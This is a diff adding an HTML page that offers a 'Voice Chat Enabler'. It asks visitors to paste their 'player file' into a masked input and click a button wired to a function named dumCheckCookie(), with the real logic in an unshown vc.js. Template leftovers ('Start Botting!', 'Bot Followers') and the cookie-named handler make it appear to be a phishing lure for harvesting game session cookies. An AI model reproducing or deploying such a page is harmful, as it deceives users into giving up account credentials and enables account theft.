@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Voice Chat Enabler</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="vc.css" rel="stylesheet" type="text/css">
+
+</head>
+<body class="text-white min-h-screen flex flex-col items-center justify-center font-sans">
+
+  <div id="dumPreload" class="bg-gray-900">
+    <div class="flex flex-col items-center">
+      <svg class="animate-spin h-12 w-12 text-purple-500" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8H4z"></path>
+      </svg>
+      <p class="mt-4 text-purple-400 text-lg font-semibold">Loading...</p>
+    </div>
+  </div>
+
+  <div class="dumBg"></div>
+
+  <div id="dumContent" class="w-full max-w-6xl px-6">
+    <header class="text-center mb-12">
+      <h1 class="text-5xl font-extrabold tracking-wide text-purple-400">Voice Chat enabler ⭐</h1>
+      <p class="text-lg mt-4 text-gray-300">Enable Voice Chat with ease using this futuristic system!</p>
+    </header>
+    <main class="flex flex-col md:flex-row items-stretch justify-center gap-10">
+      <!-- Left Section: Bot Followers -->
+      <section class="section-bg p-8 rounded-3xl shadow-xl flex-1 text-center max-w-md md:max-w-lg flex flex-col">
+        <h2 class="text-3xl font-bold mb-6 text-purple-300">Voice Chat enabler 🚀</h2>
+        <p class="text-gray-400 mb-6">
+          Paste your player file in the box below, then click <span class="font-semibold">"Start Botting!"</span> If you're unsure
+          how to find the "player file," watch the tutorial.
+        </p>
+        <div class="relative flex items-center w-full mt-auto">
+          <span class="absolute left-4 text-gray-400">
+            <i class="fas fa-file-alt"></i>
+          </span>
+          <input
+            id="dumInput"
+            type="password"
+            placeholder="Enter player file"
+            class="pl-12 p-4 rounded-full input-bg border focus:outline-none focus:ring-2 focus:ring-purple-400 w-full"
+          >
+        </div>
+        <button
+          id="dumButton"
+          class="py-4 rounded-full button-gradient hover:bg-purple-600 transition-all text-lg font-semibold shadow-lg dumScale w-full mt-4"
+          onclick="dumCheckCookie()"
+        >
+          Enable Voice Chat
+        </button>
+      </section>
+    
+      <!-- Right Section: How to Use -->
+      <section class="section-bg p-8 rounded-3xl shadow-xl flex-1 max-w-lg text-center flex flex-col">
+        <h2 class="text-3xl font-bold mb-6 text-purple-300">How to Use?</h2>
+        <div class="relative h-64 overflow-y-auto rounded-2xl bg-gray-800 border border-gray-700 flex-1">
+        <video
+          style="background-color:rgb(0, 0, 0);"
+            controls
+            src="/../vids/vid.mp4"
+            class="w-full h-full rounded-2xl"
+            title="Video Tutorial">
+          </video>
+        </div>
+      </section>
+    </main>    
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+  <script src="vc.js"></script>
+</body>
+</html>
